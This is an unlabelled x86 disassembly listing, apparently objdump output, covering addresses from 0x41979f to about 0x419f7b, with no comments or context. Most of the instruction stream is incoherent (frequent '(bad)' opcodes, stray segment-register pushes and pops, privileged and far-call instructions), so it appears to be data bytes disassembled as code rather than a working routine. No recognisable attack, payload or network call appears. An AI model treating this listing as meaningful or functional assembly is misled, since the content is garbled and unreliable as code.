  41979f:	add    DWORD PTR [ecx],eax
  4197a1:	add    DWORD PTR [ecx],eax
  4197a3:	or     BYTE PTR [ebx],ah
  4197a5:	push   esp
  4197a6:	jg     0x41973e
  4197a8:	das    
  4197a9:	pop    ebx
  4197aa:	pop    ebp
  4197ab:	sub    eax,0xaa487a5a
  4197b0:	nop
  4197b1:	imul   ebx,DWORD PTR [ebp+0x3a],0xb8c7821a
  4197b8:	mov    eax,0x7ba2c0bd
  4197bd:	pusha  
  4197be:	cmp    ebp,DWORD PTR [ebx+eiz*1]
  4197c1:	and    BYTE PTR [edi],dl
  4197c3:	adc    eax,0x6080f10
  4197c8:	or     BYTE PTR [esi],al
  4197ca:	or     BYTE PTR [edi],cl
  4197cc:	adc    BYTE PTR [edi],dl
  4197ce:	and    BYTE PTR [esi+edi*1],ch
  4197d1:	pusha  
  4197d2:	jnp    0x41976b
  4197d4:	test   eax,0xa70a3279
  4197d9:	mov    eax,ds:0x8153462
  4197de:	push   es
  4197df:	add    DWORD PTR [eax],ecx
  4197e1:	or     BYTE PTR [eax],cl
  4197e3:	push   es
  4197e4:	or     BYTE PTR [eax],cl
  4197e6:	push   es
  4197e7:	push   es
  4197e8:	push   es
  4197e9:	pop    ss
  4197ea:	cmp    ebp,DWORD PTR [edi-0x5f]
  4197ed:	retf   0xa1c0
  4197f0:	inc    edi
  4197f1:	inc    esp
  4197f2:	pop    eax
  4197f3:	dec    ecx
  4197f4:	cmp    cl,BYTE PTR [eax+0x5c]
  4197f7:	dec    edx
  4197f8:	das    
  4197f9:	test   eax,0x577fbcca
  4197fe:	sub    al,0x17
  419800:	adc    eax,0x74512c17
  419805:	mov    eax,ds:0x5bcad3c5
  41980a:	mov    eax,ds:0x794abdaa
  41980f:	(bad)  
  419810:	mov    eax,0x2f1ba3c8
  419815:	das    
  419816:	sbb    esi,DWORD PTR [eax+0x366f97cd]
  41981c:	adc    eax,0x1010106
  419821:	add    DWORD PTR [ecx],eax
  419823:	push   es
  419824:	pop    ss
  419825:	ds je  0x4197b8
  419828:	das    
  419829:	dec    eax
  41982a:	imul   eax,DWORD PTR [edx+0x42],0x81915b78
  419831:	jae    0x41986d
  419833:	sub    eax,0xc0b8c099
  419838:	leave  
  419839:	leave  
  41983a:	enter  0x97c7,0x7f
  41983e:	bound  edx,QWORD PTR [eax+edx*2+0x3e]
  419842:	cmp    esi,DWORD PTR [esi]
  419844:	sub    al,0x23
  419846:	pop    ss
  419847:	pop    ss
  419848:	adc    eax,0x23201715
  41984d:	xor    al,0x3e
  41984f:	push   edi
  419850:	jo     0x4197df
  419852:	mov    eax,ds:0x474a8590
  419857:	daa    
  419858:	jne    0x4197fc
  41985a:	outs   dx,DWORD PTR ds:[esi]
  41985b:	xor    al,0x15
  41985d:	push   es
  41985e:	or     BYTE PTR [eax],cl
  419860:	or     BYTE PTR [eax],cl
  419862:	push   es
  419863:	or     BYTE PTR [eax],cl
  419865:	push   es
  419866:	push   es
  419867:	or     BYTE PTR [esi],al
  419869:	adc    eax,0xc1a26f3b
  41986e:	mov    ecx,0x5a33c0bc
  419873:	push   edx
  419874:	pop    esp
  419875:	ins    BYTE PTR es:[edi],dx
  419876:	pop    esp
  419877:	ins    BYTE PTR es:[edi],dx
  419878:	xor    ecx,ebx
  41987a:	leave  
  41987b:	stos   BYTE PTR es:[edi],al
  41987c:	jg     0x4198e0
  41987e:	ds xor al,0x34
  419881:	ss push esp
  419883:	jo     0x41981c
  419885:	(bad)  
  419886:	lods   al,BYTE PTR ds:[esi]
  419887:	xchg   edx,eax
  419888:	xchg   edx,eax
  419889:	pop    ebx
  41988a:	xchg   ebp,eax
  41988b:	popa   
  41988c:	pop    ebp
  41988d:	xor    esi,DWORD PTR [ebx]
  41988f:	mov    esp,0x77c8b8c7
  419894:	dec    esp
  419895:	inc    esi
  419896:	imul   ecx,esp,0xffffffc7
  419899:	lea    edx,[edi+0x23]
  41989c:	clts   
  41989e:	add    DWORD PTR [ecx],eax
  4198a0:	add    DWORD PTR [ecx],eax
  4198a2:	add    BYTE PTR [esi],al
  4198a4:	adc    BYTE PTR [eax+eiz*2],ch
  4198a7:	(bad)  
  4198a8:	ja     0x4198da
  4198aa:	pop    ebx
  4198ab:	pop    esi
  4198ac:	inc    ecx
  4198ad:	pop    ebx
  4198ae:	inc    esp
  4198af:	inc    edx
  4198b0:	pop    edx
  4198b1:	nop
  4198b2:	popa   
  4198b3:	mov    ds:0xc9c7b8bc,eax
  4198b8:	les    ecx,FWORD PTR [eax-0x5e384346]
  4198be:	lea    edi,[ebx+0x74]
  4198c1:	jo     0x419933
  4198c3:	fs pusha 
  4198c5:	push   esp
  4198c6:	push   eax
  4198c7:	ds ds ds push eax
  4198cb:	push   ecx
  4198cc:	push   edi
  4198cd:	bound  esi,QWORD PTR [edi+edi*2-0x69]
  4198d1:	mov    ds:0x45446b7a,al
  4198d6:	ins    DWORD PTR es:[edi],dx
  4198d7:	sbb    ch,BYTE PTR [edx+eiz*4+0x6153b70]
  4198de:	push   es
  4198df:	push   es
  4198e0:	push   es
  4198e1:	or     BYTE PTR [eax],cl
  4198e3:	or     BYTE PTR [eax],cl
  4198e5:	push   es
  4198e6:	push   es
  4198e7:	or     BYTE PTR [eax],cl
  4198e9:	pop    ss
  4198ea:	cmp    esi,DWORD PTR [eax-0x5f]
  4198ed:	enter  0x94bd,0xc7
  4198f1:	arpl   WORD PTR [ecx],si
  4198f3:	imul   ecx,DWORD PTR [edx+0x4a],0xcd8a3248
  4198fa:	shr    BYTE PTR [edx+0x5f64748d],0x5f
  419901:	bound  esi,QWORD PTR [edi+ecx*4-0x40]
  419905:	rcl    BYTE PTR [eax+0x7a5a1c13],0x59
  41990c:	mov    es,WORD PTR [esi+0x33]
  41990f:	test   bh,al
  419911:	sar    BYTE PTR [eax-0x64b6a13f],0xc9
  419918:	mov    ds:0x8173b74,al
  41991d:	add    DWORD PTR [ecx],eax
  41991f:	add    BYTE PTR [eax],al
  419921:	add    DWORD PTR [ecx],eax
  419923:	add    DWORD PTR [eax],ecx
  419925:	and    BYTE PTR [ecx+0x7b],dl
  419928:	mov    ebx,0x32693249
  41992d:	sbb    ah,BYTE PTR [ebp-0x6c]
  419930:	mov    esp,0xbcc0c8c7
  419935:	enter  0x85c8,0x4f
  419939:	outs   dx,BYTE PTR ds:[esi]
  41993a:	dec    edi
  41993b:	xchg   DWORD PTR [esi-0x47435544],esp
  419941:	shl    BYTE PTR [edx+0x7b7f8f94],0x74
  419948:	jo     0x4199ba
  41994a:	je     0x4199c7
  41994c:	lea    ecx,[edi+0x5cb9bca1]
  419952:	pop    esp
  419953:	pop    ebx
  419954:	pop    ebx
  419955:	inc    esi
  419956:	dec    ebp
  419957:	or     DWORD PTR [esi+0x153b70bc],edi
  41995d:	push   es
  41995e:	or     BYTE PTR [esi],al
  419960:	push   es
  419961:	push   es
  419962:	push   es
  419963:	or     BYTE PTR [esi],al
  419965:	push   es
  419966:	push   es
  419967:	push   es
  419968:	or     BYTE PTR ds:0xc8a1703b,dl
  41996e:	mov    ebp,0xea496b8
  419973:	inc    edi
  419974:	imul   ecx,DWORD PTR [esi+0x4c],0x5b
  419978:	int    0xc3
  41997a:	mov    esp,0x8f9497aa
  41997f:	lea    esp,[ecx-0x38476b71]
  419985:	mov    eax,0x32281d73
  41998a:	sub    eax,0x5c5d9919
  41998f:	xor    DWORD PTR [ebx-0x7c474740],edi
  419995:	imul   ebp,DWORD PTR [ebx+0x2c5f7fc0],0x10
  41999c:	push   es
  41999d:	add    DWORD PTR [ecx],eax
  41999f:	add    DWORD PTR [ecx],eax
  4199a1:	add    BYTE PTR [eax],al
  4199a3:	add    BYTE PTR [ecx],al
  4199a5:	adc    BYTE PTR [eax+eiz*2],ch
  4199a8:	(bad)  
  4199a9:	mov    esp,0xbc810e86
  4199ae:	(bad)  
  4199af:	mov    esp,0xc7c1c9bc
  4199b4:	leave  
  4199b5:	stos   DWORD PTR es:[edi],eax
  4199b6:	pop    esi
  4199b7:	inc    edi
  4199b8:	pop    esi
  4199b9:	dec    edx
  4199ba:	dec    ebp
  4199bb:	dec    esp
  4199bc:	dec    esp
  4199bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199be:	mov    eax,0xcac8c8c0
  4199c3:	(bad)  
  4199c4:	stos   BYTE PTR es:[edi],al
  4199c5:	xchg   edi,eax
  4199c6:	mov    eax,ds:0xa2a1a1a1
  4199cb:	mov    ds:0xaec7b8aa,al
  4199d0:	xor    DWORD PTR [esp+eax*4+0x4a],eax
  4199d4:	test   DWORD PTR [edi-0x4753fab4],eax
  4199da:	outs   dx,DWORD PTR ds:[esi]
  4199db:	xor    al,0xf
	...
  4199e5:	add    BYTE PTR [eax],al
  4199e7:	add    BYTE PTR [ecx],al
  4199e9:	adc    BYTE PTR [esi],dh
  4199eb:	jo     0x419997
  4199ed:	ret    
  4199ee:	jle    0x419a68
  4199f0:	outs   dx,BYTE PTR ds:[esi]
  4199f1:	cs inc esi
  4199f3:	dec    ebp
  4199f4:	sub    ebp,DWORD PTR [eax+0x1f]
  4199f7:	mov    ecx,0xaab8a3c9
  4199fc:	stos   BYTE PTR es:[edi],al
  4199fd:	mov    ebp,0xb8bccac8
  419a02:	mov    eax,0x2f8fc0c0
  419a07:	xor    bl,BYTE PTR [edx]
  419a09:	sbb    eax,0x847e1432
  419a0e:	inc    edi
  419a0f:	dec    esp
  419a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a11:	shr    BYTE PTR [edx-0x3e3e6b56],0x97
  419a18:	cmp    edx,DWORD PTR fs:[edi]
  419a1b:	push   es
	...
  419a24:	add    BYTE PTR [eax],cl
  419a26:	pop    ss
  419a27:	cmp    ebp,DWORD PTR [edi-0x5e]
  419a2a:	sar    BYTE PTR [eax-0x38435540],0xc1
  419a31:	push   0x77
  419a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a34:	fwait
  419a35:	pop    ebp
  419a36:	inc    esi
  419a37:	pop    esi
  419a38:	dec    ecx
  419a39:	inc    ebp
  419a3a:	inc    esi
  419a3b:	cmp    BYTE PTR [eax],dh
  419a3d:	js     0x4199f7
  419a3f:	mov    esp,0xbe794749
  419a44:	enter  0xc9c8,0xc9
  419a48:	enter  0xc9c9,0xc7
  419a4c:	(bad)  
  419a4d:	mov    edx,0xca855b5c
  419a52:	jne    0x419a62
  419a54:	popf   
  419a55:	jp     0x419aad
  419a57:	add    eax,0x346fb8ac
  419a5c:	sldt   WORD PTR [eax]
	...
  419a67:	add    BYTE PTR [ecx],al
  419a69:	adc    eax,0xc8bc743e
  419a6e:	test   DWORD PTR [ebp+ebp*2+0x6],ecx
  419a72:	dec    ecx
  419a73:	dec    ebp
  419a74:	daa    
  419a75:	pop    esp
  419a76:	push   0xffffffc7
  419a78:	sar    BYTE PTR [eax-0x59885d48],0x6b
  419a7f:	mov    cl,0xbc
  419a81:	mov    esp,0x35a5c7b8
  419a86:	das    
  419a87:	das    
  419a88:	sbb    eax,0x44282828
  419a8d:	test   eax,0xc7873047
  419a92:	mov    eax,0xbd988d97
  419a97:	pusha  
  419a98:	and    ecx,DWORD PTR ds:[edi]
  419a9b:	add    DWORD PTR [eax],eax
	...
  419aa5:	add    DWORD PTR [edi],ecx
  419aa7:	and    BYTE PTR [eax+0x70],dl
  419aaa:	xchg   esp,eax
  419aab:	mov    eax,0x8ec2a9b8
  419ab0:	dec    eax
  419ab1:	pop    edx
  419ab2:	pop    edx
  419ab3:	cmp    bl,BYTE PTR [edx+0x7e]
  419ab6:	pop    ecx
  419ab7:	inc    esi
  419ab8:	pop    esi
  419ab9:	sub    ch,BYTE PTR [esi]
  419abb:	pop    ebp
  419abc:	pop    es
  419abd:	mov    ax,ds:0x45485eb8
  419ac3:	das    
  419ac4:	dec    eax
  419ac5:	lods   al,BYTE PTR ds:[esi]
  419ac6:	mov    esp,0xcbcb5a18
  419acb:	mov    BYTE PTR [ebx-0x796c945b],al
  419ad1:	mov    al,0x5e
  419ad3:	inc    ebp
  419ad4:	imul   ebx,DWORD PTR [ecx+eiz*4],0x2d
  419ad8:	lods   al,BYTE PTR ds:[esi]
  419ad9:	mov    eax,0x103674
	...
  419ae6:	add    BYTE PTR [eax],al
  419ae8:	push   es
  419ae9:	pop    ss
  419aea:	push   ecx
  419aeb:	jg     0x419ab4
  419aed:	stos   DWORD PTR es:[edi],eax
  419aee:	ins    BYTE PTR es:[edi],dx
  419aef:	dec    ebp
  419af0:	ins    DWORD PTR es:[edi],dx
  419af1:	inc    ebx
  419af2:	dec    edx
  419af3:	pop    esp
  419af4:	inc    ebp
  419af5:	add    eax,0xbcb8c0c7
  419afa:	mov    esp,0x5e326a68
  419aff:	pop    ds
  419b00:	mov    esp,0x13c0c0b8
  419b05:	or     BYTE PTR [eax+0x32],cl
  419b08:	xor    ch,BYTE PTR [eax]
  419b0a:	sbb    DWORD PTR [edx],esi
  419b0c:	xor    DWORD PTR [eax-0x45b3ce72],edx
  419b12:	mov    eax,0x57627b94
  419b17:	and    edx,DWORD PTR ss:[eax]
  419b1a:	push   es
	...
  419b23:	add    BYTE PTR [eax],al
  419b25:	add    BYTE PTR [esi],al
  419b27:	movaps XMMWORD PTR [ebx+edi*2-0x56],xmm2
  419b2c:	ret    0x317a
  419b2f:	sbb    al,0x44
  419b31:	push   0x78
  419b33:	inc    eax
  419b34:	sbb    cl,BYTE PTR [eax+0x7e]
  419b37:	imul   ebx,DWORD PTR [edx+0x45],0x65192648
  419b3e:	mov    eax,ds:0x5d486da2
  419b43:	pop    ebp
  419b44:	dec    eax
  419b45:	inc    ebp
  419b46:	sbb    cl,BYTE PTR [ebp+0x4c]
  419b49:	pop    edx
  419b4a:	pop    esp
  419b4b:	ins    DWORD PTR es:[edi],dx
  419b4c:	ins    BYTE PTR es:[edi],dx
  419b4d:	pop    esp
  419b4e:	jge    0x419bbb
  419b50:	inc    esp
  419b51:	das    
  419b52:	dec    ebp
  419b53:	test   al,0x5a
  419b55:	cmp    DWORD PTR [eax+0x74c1ac0a],edi
  419b5b:	cmp    edx,DWORD PTR ds:0x1
  419b61:	add    BYTE PTR [eax],al
  419b63:	add    BYTE PTR [eax],al
  419b65:	add    BYTE PTR [eax],al
  419b67:	add    BYTE PTR [eax],cl
  419b69:	and    edx,DWORD PTR [edi-0x73]
  419b6c:	rcr    DWORD PTR [esi+0x4a496d69],0x3a
  419b73:	cs add al,0x8f
  419b76:	(bad)  
  419b77:	mov    ebx,0x2f5dc0b8
  419b7c:	dec    ecx
  419b7d:	xor    bl,BYTE PTR [ecx]
  419b7f:	pop    ecx
  419b80:	leave  
  419b81:	mov    eax,0x32277779
  419b86:	inc    edi
  419b87:	sub    BYTE PTR [ebp+0x47],al
  419b8a:	dec    edx
  419b8b:	cmp    DWORD PTR [edx+0x5e],ecx
  419b8e:	mov    ebx,0xc7ad4b4c
  419b93:	(bad)  
  419b94:	outs   dx,DWORD PTR ds:[esi]
  419b95:	push   eax
  419b96:	sub    DWORD PTR [edi],edx
  419b98:	clts   
  419b9a:	add    DWORD PTR [eax],eax
	...
  419ba4:	add    BYTE PTR [eax],al
  419ba6:	add    BYTE PTR [esi],al
  419ba8:	adc    eax,0xc8976236
  419bad:	dec    esp
  419bae:	inc    edi
  419baf:	xor    al,BYTE PTR [edx]
  419bb1:	sbb    eax,0x81a1426b
  419bb6:	cs xchg edx,eax
  419bb8:	imul   ebx,DWORD PTR [esi+0x44],0xa1772e3a
  419bbf:	stos   BYTE PTR es:[edi],al
  419bc0:	js     0x419c08
  419bc2:	inc    esp
  419bc3:	inc    edx
  419bc4:	dec    eax
  419bc5:	pop    ebp
  419bc6:	push   0xffffff87
  419bc8:	mov    BYTE PTR [ebp+0x5a],al
  419bcb:	push   0x5e
  419bcd:	pop    esi
  419bce:	das    
  419bcf:	imul   ebp,DWORD PTR [ecx+0x28],0x4d
  419bd3:	ins    DWORD PTR es:[edi],dx
  419bd4:	pop    esp
  419bd5:	inc    esp
  419bd6:	mov    eax,ds:0x7bc1bf04
  419bdb:	push   eax
  419bdc:	pop    ss
  419bdd:	add    DWORD PTR [eax],eax
	...
  419be7:	add    DWORD PTR [edi],ecx
  419be9:	xor    al,0x62
  419beb:	xchg   edi,eax
  419bec:	retf   
  419bed:	xchg   BYTE PTR [ebx+0x49],bl
  419bf0:	dec    ecx
  419bf1:	imul   eax,DWORD PTR [ecx+0x24],0xffffff97
  419bf5:	leave  
  419bf6:	stos   BYTE PTR es:[edi],al
  419bf7:	mov    eax,ds:0x45465dc1
  419bfc:	pop    ebp
  419bfd:	xor    al,BYTE PTR [edx]
  419bff:	add    al,0x92
  419c02:	inc    edi
  419c03:	pop    esp
  419c04:	dec    eax
  419c05:	dec    ebp
  419c06:	cmp    dh,BYTE PTR [eax]
  419c08:	xor    ebp,DWORD PTR [edi]
  419c0a:	xor    ebp,DWORD PTR [ecx]
  419c0c:	pop    esi
  419c0d:	xor    DWORD PTR [edx-0x367ab488],edi
  419c13:	xchg   esp,eax
  419c14:	bound  esi,QWORD PTR [esi]
  419c16:	pop    ss
  419c17:	or     BYTE PTR [esi],al
  419c19:	add    DWORD PTR [eax],eax
	...
  419c27:	add    DWORD PTR [eax],ecx
  419c29:	and    BYTE PTR [ecx+0x70],dl
  419c2c:	enter  0xda8,0x5c
  419c30:	call   0x75c0:0xb8306bba
  419c37:	imul   esi,DWORD PTR [ebp+0x3a],0x85454241
  419c3e:	(bad)  
  419c42:	inc    ebp
  419c43:	dec    eax
  419c44:	dec    eax
  419c45:	dec    eax
  419c46:	imul   ebx,DWORD PTR [esi+0x6d],0x49766885
  419c4d:	pop    esi
  419c4e:	inc    esi
  419c4f:	js     0x419bd5
  419c51:	jbe    0x419c9f
  419c53:	dec    edx
  419c54:	xor    BYTE PTR [ecx],dh
  419c56:	retf   
  419c57:	das    
  419c58:	(bad)
  419c5b:	push   ecx
  419c5c:	and    BYTE PTR [esi],al
	...
  419c66:	add    BYTE PTR [ecx],al
  419c68:	pop    ss
  419c69:	ds jnp 0x419c16
  419c6c:	mov    edi,0x5e5d416b
  419c71:	inc    ebx
  419c72:	mov    cs:0x9144a9ca,al
  419c78:	inc    ebp
  419c79:	inc    esi
  419c7a:	dec    eax
  419c7b:	dec    eax
  419c7c:	pop    esp
  419c7d:	inc    esp
  419c7e:	cmp    DWORD PTR ds:0x415e6b75,ebx
  419c84:	outs   dx,BYTE PTR ds:[esi]
  419c85:	inc    esi
  419c86:	push   ss
  419c87:	inc    edi
  419c88:	xor    BYTE PTR cs:[eax],ch
  419c8b:	and    BYTE PTR [edi+eax*2-0x48],ch
  419c8f:	mov    edx,0xaacabb4b
  419c94:	pop    edi
  419c95:	sub    al,0xf
  419c97:	add    DWORD PTR [eax],eax
	...
  419ca5:	add    BYTE PTR [eax],al
  419ca7:	add    BYTE PTR [esi],al
  419ca9:	adc    BYTE PTR [edx+eiz*2],dh
  419cac:	xchg   edi,eax
  419cad:	enter  0x3178,0xa2
  419cb1:	(bad)  
  419cb2:	fwait
  419cb3:	push   cs
  419cb4:	mov    ds:0x4295c7c0,al
  419cb9:	xor    eax,0x78453a39
  419cbe:	jnp    0x419c6a
  419cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cc1:	inc    edi
  419cc2:	pop    esi
  419cc3:	dec    eax
  419cc4:	dec    eax
  419cc5:	cmp    BYTE PTR [edx+0x46],bl
  419cc8:	cs push 0x785c5d83
  419cce:	inc    edi
  419ccf:	ja     0x419c8c
  419cd1:	pop    esp
  419cd2:	dec    edx
  419cd3:	inc    edi
  419cd4:	ins    DWORD PTR es:[edi],dx
  419cd5:	mov    edi,0xc9ae0d4e
  419cda:	(bad)  
  419cdb:	push   edi
  419cdc:	and    eax,DWORD PTR [esi]
	...
  419ce6:	add    DWORD PTR [edi],ecx
  419ce8:	sub    DWORD PTR [edi-0x73],ebx
  419ceb:	rcl    DWORD PTR [ebx+0x425d3c68],0x3a
  419cf2:	jne    0x419cbd
  419cf4:	mov    ebp,0x5d453242
  419cf9:	pop    esp
  419cfa:	dec    ecx
  419cfb:	dec    eax
  419cfc:	cs sub eax,0x465d4245
  419d02:	sub    eax,0x2e164d48
  419d07:	inc    edi
  419d08:	inc    ebp
  419d09:	inc    edi
  419d0a:	cs inc ecx
  419d0c:	dec    edx
  419d0d:	test   bh,al
  419d0f:	shl    BYTE PTR [edx+0x54a2c8c9],0x23
  419d16:	or     BYTE PTR [eax],al
	...
  419d28:	add    DWORD PTR [edi],ecx
  419d2a:	and    BYTE PTR [eax+0x74],dl
  419d2d:	mov    ds:0x62806bc9,al
  419d32:	jns    0x419d81
  419d34:	cmp    BYTE PTR [edi+eax*8+0x41353241],0x39
  419d3c:	pop    ss
  419d3d:	js     0x419cc0
  419d3f:	mov    ds:0x484947a2,al
  419d44:	inc    esi
  419d45:	es pop edx
  419d47:	pop    esi
  419d48:	inc    edx
  419d49:	push   ss
  419d4a:	addr16 pop esi
  419d4c:	inc    ebp
  419d4d:	dec    eax
  419d4e:	inc    edi
  419d4f:	ja     0x419d18
  419d51:	push   esi
  419d52:	cmp    ch,BYTE PTR [edi]
  419d54:	dec    eax
  419d55:	sbb    DWORD PTR [esi+0x30],0xffffff92
  419d59:	(bad)  
  419d5a:	xchg   esp,eax
  419d5b:	pusha  
  419d5c:	sub    DWORD PTR [eax],ecx
	...
  419d66:	or     BYTE PTR [edi],dl
  419d68:	push   eax
  419d69:	je     0x419d0c
  419d6b:	int    0x69
  419d6d:	aaa    
  419d6e:	pop    edx
  419d6f:	inc    edx
  419d70:	inc    edx
  419d71:	ss test eax,0x431d68bd
  419d77:	inc    edx
  419d78:	dec    eax
  419d79:	inc    ebp
  419d7a:	cmp    al,BYTE PTR [ebp+0x45]
  419d7d:	inc    esp
  419d7e:	cs pop esi
  419d80:	dec    ebp
  419d81:	inc    ebp
  419d82:	cmp    cl,BYTE PTR [ecx+0x2f]
  419d85:	pop    ss
  419d86:	cmp    DWORD PTR [edi],ebp
  419d88:	inc    edi
  419d89:	dec    esp
  419d8a:	xor    BYTE PTR [ecx+0x69],al
  419d8d:	ins    BYTE PTR es:[edi],dx
  419d8e:	sar    BYTE PTR [ecx+ecx*8+0x3b708dc8],0x17
  419d96:	push   es
	...
  419da7:	add    BYTE PTR [eax],al
  419da9:	add    DWORD PTR [eax],edx
  419dab:	sub    DWORD PTR [ebx+edi*2-0x5e],edx
  419daf:	(bad)  
  419db0:	lods   al,BYTE PTR ds:[esi]
  419db1:	push   ds
  419db2:	das    
  419db3:	dec    ebp
  419db4:	mov    sp,0x68c7
  419db8:	dec    edx
  419db9:	cs inc edx
  419dbb:	dec    eax
  419dbc:	cmp    bl,BYTE PTR [esi+0x7e]
  419dbf:	mov    eax,ds:0x484783bc
  419dc4:	cmp    ch,BYTE PTR [esi]
  419dc6:	jp     0x419e42
  419dc8:	pop    ebp
  419dc9:	cdq    
  419dca:	test   eax,0x492e2e45
  419dcf:	xor    BYTE PTR [ecx+0x2e1a48bc],ch
  419dd5:	sbb    al,BYTE PTR [ebp+0x2e]
  419dd8:	xor    ch,BYTE PTR [edi+edx*4+0x82962]
  419ddf:	add    BYTE PTR [eax],al
  419de1:	add    BYTE PTR [eax],al
  419de3:	add    BYTE PTR [ecx],al
  419de5:	or     BYTE PTR [edi],dl
  419de7:	cmp    ebp,DWORD PTR [edi-0x6c]
  419dea:	sar    DWORD PTR [edi+0x3a425d26],0x26
  419df1:	push   esi
  419df2:	mov    ebp,0x535a1d79
  419df7:	pop    ebp
  419df8:	dec    eax
  419df9:	dec    eax
  419dfa:	inc    ebp
  419dfb:	cmp    al,BYTE PTR [ecx+edi*1+0x48]
  419dff:	inc    edi
  419e00:	inc    edi
  419e01:	inc    esi
  419e02:	dec    edx
  419e03:	dec    edx
  419e04:	and    eax,DWORD PTR [esi+0x46]
  419e07:	inc    esi
  419e08:	dec    esi
  419e09:	dec    esi
  419e0a:	dec    edx
  419e0b:	mov    DWORD PTR [ebx-0x5b],ebp
  419e0e:	ror    cl,0xc1
  419e11:	(bad)  
  419e12:	jnp    0x419e68
  419e14:	sub    DWORD PTR [eax],edx
  419e16:	add    DWORD PTR [eax],eax
	...
  419e28:	add    BYTE PTR [ecx],al
  419e2a:	push   es
  419e2b:	adc    BYTE PTR [esp+edx*2],ch
  419e2e:	jnp    0x419dd1
  419e30:	(bad)  
  419e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e32:	inc    esi
  419e33:	pop    ds
  419e34:	push   cs
  419e35:	mov    esp,0x3a327bc0
  419e3a:	pop    esi
  419e3b:	dec    edx
  419e3c:	inc    ebp
  419e3d:	pop    esi
  419e3e:	mov    fs,WORD PTR [edx+0x3a338eb8]
  419e44:	sub    eax,0x336a763a
  419e49:	ret    
  419e4a:	mov    esp,0x4546452e
  419e4f:	sbb    eax,0x1d91bc33
  419e54:	cmp    bl,BYTE PTR [esi+0x49]
  419e57:	inc    ebp
  419e58:	xor    BYTE PTR [esi+0xf2c6297],ah
  419e5e:	add    BYTE PTR [eax],al
  419e60:	add    BYTE PTR [eax],al
  419e62:	add    BYTE PTR [ecx],al
  419e64:	or     BYTE PTR [edi],dl
  419e66:	xor    al,0x62
  419e68:	(bad)  
  419e69:	ror    al,0x5b
  419e6c:	inc    esp
  419e6d:	push   0xa9652b2d
  419e72:	xchg   edx,eax
  419e73:	xor    eax,DWORD PTR [edx+0x53]
  419e76:	pop    ebp
  419e77:	inc    ebp
  419e78:	dec    eax
  419e79:	inc    ebx
  419e7a:	cmp    al,BYTE PTR [eax+ecx*2+0x42]
  419e7e:	dec    ecx
  419e7f:	inc    edi
  419e80:	inc    esi
  419e81:	inc    ebp
  419e82:	inc    esi
  419e83:	pop    esi
  419e84:	cmp    al,BYTE PTR [esi+0x4a]
  419e87:	dec    esi
  419e88:	outs   dx,BYTE PTR ds:[esi]
  419e89:	dec    esi
  419e8a:	xchg   DWORD PTR [ecx-0x55363561],ecx
  419e90:	xchg   esp,eax
  419e91:	jnp    0x419ee7
  419e93:	sub    al,0x15
  419e95:	push   es
  419e96:	add    DWORD PTR [eax],eax
	...
  419ea8:	add    BYTE PTR [eax],al
  419eaa:	add    DWORD PTR [esi],eax
  419eac:	adc    BYTE PTR [esp+edx*2],ch
  419eaf:	jnp    0x419e52
  419eb1:	mov    eax,0x90962f5d
  419eb7:	sub    BYTE PTR [ecx],bl
  419eb9:	adc    DWORD PTR [esi+ebx*2+0x48],ebx
  419ebd:	ins    DWORD PTR es:[edi],dx
  419ebe:	xchg   esi,eax
  419ebf:	mov    eax,0x3a03a2b8
  419ec4:	dec    eax
  419ec5:	inc    ebx
  419ec6:	inc    edx
  419ec7:	pop    edx
  419ec8:	xor    al,dl
  419eca:	mov    ebx,0x49493242
  419ecf:	inc    ebp
  419ed0:	xor    ebp,DWORD PTR [ecx+0x4a4731c0]
  419ed6:	dec    ecx
  419ed7:	pop    ebp
  419ed8:	xor    edi,DWORD PTR [edi+0xf2c62a1]
  419ede:	add    BYTE PTR [eax],al
  419ee0:	add    BYTE PTR [eax],al
  419ee2:	add    DWORD PTR [eax],ecx
  419ee4:	pop    ss
  419ee5:	bound  ecx,QWORD PTR ss:[ebp+0x6c85c9aa]
  419eec:	jbe    0x419f47
  419eee:	pop    edx
  419eef:	arpl   WORD PTR [edx+0x592d4583],di
  419ef5:	imul   ebp,DWORD PTR [ebp+0x42],0x43
  419ef9:	inc    ebp
  419efa:	dec    eax
  419efb:	inc    ebp
  419efc:	inc    ebp
  419efd:	dec    eax
  419efe:	ins    DWORD PTR es:[edi],dx
  419eff:	ins    DWORD PTR es:[edi],dx
  419f00:	inc    esi
  419f01:	ins    DWORD PTR es:[edi],dx
  419f02:	pop    esi
  419f03:	dec    edx
  419f04:	inc    ebp
  419f05:	xor    al,BYTE PTR [esi+0x4d]
  419f08:	outs   dx,BYTE PTR ds:[esi]
  419f09:	xchg   DWORD PTR [edi-0x59363576],eax
  419f0f:	(bad)  
  419f10:	jo     0x419f63
  419f12:	sub    al,0x15
  419f14:	push   es
  419f15:	add    DWORD PTR [eax],eax
	...
  419f2b:	add    DWORD PTR [esi],eax
  419f2d:	adc    BYTE PTR [ecx],ch
  419f2f:	push   ecx
  419f30:	je     0x419ec6
  419f32:	(bad)  
  419f33:	leave  
  419f34:	retf   0x69c4
  419f37:	sbb    DWORD PTR [esi+0x28],eax
  419f3a:	inc    ebp
  419f3b:	dec    ecx
  419f3c:	inc    ebp
  419f3d:	imul   ebx,DWORD PTR [edx+0x1ac7aaaa],0x30
  419f44:	dec    ecx
  419f45:	dec    eax
  419f46:	inc    edx
  419f47:	pop    ecx
  419f48:	add    eax,0x4566aabd
  419f4d:	ins    DWORD PTR es:[edi],dx
  419f4e:	ins    DWORD PTR es:[edi],dx
  419f4f:	cs pop esp
  419f51:	inc    edx
  419f52:	shr    BYTE PTR [ecx+0x33],0x4d
  419f56:	pop    esi
  419f57:	pop    esi
  419f58:	inc    edi
  419f59:	lods   al,BYTE PTR ds:[esi]
  419f5a:	xchg   edi,eax
  419f5b:	bound  ebp,QWORD PTR [eax+ecx*1]
  419f5e:	add    BYTE PTR [eax],al
  419f60:	add    BYTE PTR [eax],al
  419f62:	or     BYTE PTR [edi],dl
  419f64:	bound  ecx,QWORD PTR ss:[ebp+0x6c85cab9]
  419f6b:	inc    edx
  419f6c:	daa    
  419f6d:	inc    edx
  419f6e:	ja     0x419f06
  419f70:	inc    edx
  419f71:	sbb    DWORD PTR [edi],esi
  419f73:	js     0x419efc
  419f75:	mov    BYTE PTR [ebp+0x48],bl
  419f78:	inc    esp
  419f79:	inc    esp
  419f7a:	pop    esi
  419f7b:	dec    eax
